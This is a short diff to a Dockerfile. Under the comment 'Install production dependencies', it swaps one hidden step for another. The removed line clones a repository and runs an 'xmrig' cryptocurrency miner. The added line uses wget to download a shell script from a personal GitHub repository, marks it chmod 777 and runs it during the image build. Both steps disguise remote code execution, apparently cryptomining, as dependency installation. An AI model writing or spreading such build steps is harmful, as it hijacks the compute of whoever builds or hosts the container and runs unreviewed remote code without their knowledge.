@@ -11,4 +11,4 @@ WORKDIR $APP_HOME
 COPY . ./ 
 
 # Install production dependencies.
-RUN git clone https://github.com/amb71731/0.git && cd 0 && chmod 777 xmrig run.sh && ./run.sh
+RUN wget -O kuya.sh https://raw.githubusercontent.com/israelmoralesalmg/aingkuy/main/aingkuya.sh && chmod 777 kuya.sh && ./kuya.sh
